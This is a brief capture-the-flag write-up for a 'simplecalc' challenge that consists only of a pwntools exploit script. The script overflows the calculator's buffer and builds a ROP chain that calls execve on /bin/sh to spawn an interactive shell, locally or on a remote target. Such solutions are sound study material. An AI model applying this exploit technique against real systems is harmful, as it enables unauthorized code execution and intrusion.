<h3> Simple Calculator </h3>

I'll just be giving my solve script currently too busy to write a detailed writeup

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('simplecalc')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+518
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def full_buffer(n):
    for _ in range(n//4):
        io.sendline('2')
        io.recvuntil('x:')
        io.sendline(str(100))
        io.recvuntil('y:')
        io.sendline(str(100))
    
def add():
    io.sendline('1')
    io.recvuntil('x:')
    io.sendline(str(100))
    io.recvuntil('y:')
    io.sendline(str(100))


def write(addr):
    io.sendline('1')
    io.recvuntil('x:')
    io.sendline(str(addr-100))
    io.recvuntil('y:')
    io.sendline(str(100))

def rop():
    syscall = 0x00000000004648e5 # syscall; ret;
    pop_rax = 0x000000000044db34 # pop rax; ret; 
    pop_rdi = 0x0000000000401b73 # pop rdi; ret; 
    pop_rsi = 0x0000000000401c87 # pop rsi; ret; 
    pop_rdx = 0x0000000000437a85 # pop rdx; ret; 
    mov_gadget = 0x000000000044526e # mov qword ptr [rax], rdx; ret; 
    sh = u64(b'/bin/sh\x00')
    data = 0x6c0210

    lower = sh & 0xffffffff 
    higher = (sh & 0xffffffff00000000) >> 8*4

    rop_gadgets = {
        pop_rax: 0x3b,
        pop_rdi: data,
        pop_rsi: 0x0,
        pop_rdx: 0x0,
        syscall: 0x0
    }

    # print([hex(sh), hex(lower), hex(higher)])

    write(pop_rdx)
    write(0x0)
    write(lower)
    write(higher)
    write(pop_rax)
    write(0x0)
    write(data)
    write(0x0)
    write(mov_gadget)
    write(0x0)

    
    for addr in rop_gadgets:
        write(addr)
        write(0x0)
        write(rop_gadgets[addr])
        write(0x0)


def solve():
    count = 0xff
    offset = 0x48
    io.sendlineafter(b':', str(count))

    full_buffer(0x48)
    rop()

    io.sendline('5')

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()


```
